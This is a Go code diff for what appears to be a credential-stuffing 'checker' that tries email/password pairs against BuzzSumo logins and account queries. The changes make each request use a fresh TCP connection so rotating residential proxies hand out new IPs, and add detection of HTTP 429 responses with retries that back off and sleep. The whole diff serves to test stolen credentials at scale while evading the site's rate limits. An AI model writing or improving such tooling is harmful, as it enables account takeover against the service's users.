@@ -81,6 +81,9 @@ func (c *Checker) freshClient(proxyURL *url.URL) (*http.Client, error) {
 	transport := &http.Transport{}
 	if proxyURL != nil {
 		transport.Proxy = http.ProxyURL(proxyURL)
+		// Fresh TCP per request helps rotating residential proxies assign a new IP.
+		transport.DisableKeepAlives = true
+		transport.MaxConnsPerHost = 2
 	}
 	return &http.Client{
 		Timeout:   timeout,
@@ -116,13 +119,14 @@ func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
 	// Step 1: GET login page (retry on HTTP 429)
 	loginBody, loginStatus, err := c.fetchLoginPage(client)
 	if err != nil {
-		result.Status = StatusError
-		result.Reason = err.Error()
+		status, reason := c.resultFromRequestErr("login page", err)
+		result.Status = status
+		result.Reason = reason
 		return result
 	}
 	if loginStatus == http.StatusTooManyRequests {
 		result.Status = StatusRateLimited
-		result.Reason = "BuzzSumo rate limit (HTTP 429) — use 3 workers or retry rate_limited.txt later"
+		result.Reason = rateLimitReason("login page HTTP 429")
 		return result
 	}
 	if loginStatus != http.StatusOK {
@@ -163,8 +167,9 @@ func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
 		"User-Agent":        c.cfg.UserAgent,
 	}, postBody)
 	if err != nil {
-		result.Status = StatusError
-		result.Reason = err.Error()
+		status, reason := c.resultFromRequestErr("login POST", err)
+		result.Status = status
+		result.Reason = reason
 		return result
 	}
 
@@ -185,7 +190,7 @@ func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
 	}
 	if postStatus == http.StatusTooManyRequests {
 		result.Status = StatusRateLimited
-		result.Reason = "login POST rate limited (HTTP 429)"
+		result.Reason = rateLimitReason("login POST HTTP 429")
 		return result
 	}
 	if postStatus == http.StatusUnauthorized || postStatus == http.StatusUnprocessableEntity || postStatus == 419 {
@@ -211,8 +216,14 @@ func (c *Checker) Check(email, password string, proxyURL *url.URL) CheckResult {
 		"User-Agent":        c.cfg.UserAgent,
 	}, "")
 	if err != nil {
-		result.Status = StatusError
-		result.Reason = err.Error()
+		status, reason := c.resultFromRequestErr("account query", err)
+		result.Status = status
+		result.Reason = reason
+		return result
+	}
+	if accountStatus == http.StatusTooManyRequests {
+		result.Status = StatusRateLimited
+		result.Reason = rateLimitReason("account query HTTP 429")
 		return result
 	}
 	if accountStatus == http.StatusUnauthorized || accountStatus == http.StatusForbidden {
@@ -330,13 +341,20 @@ func (c *Checker) fetchLoginPage(client *http.Client) (string, int, error) {
 			"User-Agent":      c.cfg.UserAgent,
 		}, "")
 		if err != nil {
+			if isRateLimitErr(err) && attempt < retries {
+				proxyRetrySleep(attempt)
+				continue
+			}
+			if isRateLimitErr(err) {
+				return "", http.StatusTooManyRequests, nil
+			}
 			return "", 0, err
 		}
 		if status == http.StatusOK {
 			return body, status, nil
 		}
-		if status == http.StatusTooManyRequests && attempt < retries {
-			time.Sleep(time.Duration(2*(attempt+1)) * time.Second)
+		if isRateLimitedStatus(status) && attempt < retries {
+			proxyRetrySleep(attempt)
 			continue
 		}
 		return body, status, nil
